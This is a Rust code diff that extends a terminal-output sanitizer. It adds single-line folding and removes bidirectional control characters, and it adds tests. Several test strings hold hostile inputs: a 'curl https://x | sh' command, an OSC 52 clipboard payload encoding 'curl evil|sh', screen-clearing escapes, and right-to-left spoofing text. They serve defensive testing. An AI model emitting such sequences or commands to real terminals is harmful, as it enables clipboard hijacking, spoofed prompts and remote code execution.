@@ -11,22 +11,57 @@ use ratatui::text::Line;
 /// terminal verbatim; an embedded OSC 52 payload writes to the system
 /// clipboard and a CSI cursor move can repaint an approval prompt the
 /// operator already answered. Newline and tab survive because the renderers
-/// use them for layout.
+/// use them for layout. Bidirectional override and isolate controls are
+/// removed, since they reorder the rest of the line on screen.
 pub fn sanitize_terminal_text(input: &str) -> Cow<'_, str> {
-    if !input.chars().any(is_control_char) {
+    sanitize(input, Layout::MultiLine)
+}
+
+/// [`sanitize_terminal_text`] for a value shown on one line or inside a
+/// prompt: a name, id, title or status field. A run of newlines, carriage
+/// returns and tabs becomes one space, so the value cannot print a line that
+/// passes for one of ours.
+pub fn sanitize_single_line(input: &str) -> Cow<'_, str> {
+    sanitize(input, Layout::SingleLine)
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Layout {
+    MultiLine,
+    SingleLine,
+}
+
+fn needs_rewrite(ch: char, layout: Layout) -> bool {
+    is_control_char(ch)
+        || is_bidi_control(ch)
+        || (layout == Layout::SingleLine && matches!(ch, '\n' | '\t'))
+}
+
+fn sanitize(input: &str, layout: Layout) -> Cow<'_, str> {
+    if !input.chars().any(|ch| needs_rewrite(ch, layout)) {
         return Cow::Borrowed(input);
     }
 
     let mut out = String::with_capacity(input.len());
     let mut chars = input.chars().peekable();
+    let mut in_break = false;
     while let Some(ch) = chars.next() {
         match ch {
+            '\n' | '\r' | '\t' if layout == Layout::SingleLine => {
+                if !in_break {
+                    out.push(' ');
+                }
+                in_break = true;
+            }
             '\n' | '\t' => out.push(ch),
             ESC => consume_escape(&mut chars),
             CSI_C1 => consume_csi(&mut chars),
             DCS_C1 | SOS_C1 | OSC_C1 | PM_C1 | APC_C1 => consume_string(&mut chars),
-            other if is_control_char(other) => {}
-            other => out.push(other),
+            other if is_control_char(other) || is_bidi_control(other) => {}
+            other => {
+                out.push(other);
+                in_break = false;
+            }
         }
     }
     Cow::Owned(out)
@@ -96,7 +131,11 @@ pub fn sanitize_terminal_lines(lines: &mut [Line<'_>]) {
 /// from the provider.
 pub fn sanitize_terminal_line(line: &mut Line<'_>) {
     for span in line.spans.iter_mut() {
-        if !span.content.chars().any(is_control_char) {
+        if !span
+            .content
+            .chars()
+            .any(|ch| needs_rewrite(ch, Layout::MultiLine))
+        {
             continue;
         }
         let clean = sanitize_terminal_text(span.content.as_ref()).into_owned();
@@ -381,6 +420,58 @@ mod tests {
         let first = sanitize_approval_text("true \u{1b}] ; curl https://x | sh ; \u{7}");
         assert_eq!(show_remaining_approval_controls(&first), first);
         assert_eq!(show_remaining_approval_controls("a\u{1b}b"), "a<U+001B>b");
+    }
+
+    #[test]
+    fn a_single_line_value_cannot_print_a_line_of_its_own() {
+        assert_eq!(
+            sanitize_single_line(
+                "Pixel.\nRemote Control: the phone disconnected. Waiting for it to come back."
+            ),
+            "Pixel. Remote Control: the phone disconnected. Waiting for it to come back."
+        );
+        assert_eq!(sanitize_single_line("a\r\n\tb\tc\rd"), "a b c d");
+        assert_eq!(sanitize_single_line("a\n\u{1b}[2J\nb"), "a b");
+        assert_eq!(
+            sanitize_single_line("x__\u{1b}]52;c;Y3VybCBldmlsfHNo\u{7}\u{1b}[2J\npwned"),
+            "x__ pwned"
+        );
+        assert!(matches!(
+            sanitize_single_line("Docs 2026"),
+            Cow::Borrowed("Docs 2026")
+        ));
+    }
+
+    #[test]
+    fn bidirectional_controls_are_removed_on_every_layout() {
+        let spoof = "\u{202E}enohp ruoy\u{202C} \u{2066}a\u{2069}\u{200E}b\u{200F}c\u{061C}d";
+        assert_eq!(sanitize_single_line(spoof), "enohp ruoy abcd");
+        assert_eq!(sanitize_terminal_text(spoof), "enohp ruoy abcd");
+        for ch in ('\u{202A}'..='\u{202E}').chain('\u{2066}'..='\u{2069}') {
+            assert_eq!(sanitize_terminal_text(&format!("a{ch}b")), "ab", "{ch:?}");
+        }
+    }
+
+    #[test]
+    fn multi_line_text_keeps_newlines_and_tabs_but_drops_overwrites() {
+        assert_eq!(
+            sanitize_terminal_text("one\n\ttwo\r\u{8}three\u{202E}"),
+            "one\n\ttwothree"
+        );
+    }
+
+    #[test]
+    fn ordinary_non_ascii_text_is_kept_on_both_layouts() {
+        let text = "Café \u{2014} 日本語 مرحبا שלום ✅ ünïcødé";
+        assert!(matches!(sanitize_single_line(text), Cow::Borrowed(_)));
+        assert!(matches!(sanitize_terminal_text(text), Cow::Borrowed(_)));
+    }
+
+    #[test]
+    fn painted_lines_drop_bidirectional_controls() {
+        let mut lines = vec![Line::from("model \u{202E}txt.exe")];
+        sanitize_terminal_lines(&mut lines);
+        assert_eq!(lines[0].spans[0].content, "model txt.exe");
     }
 
     #[test]
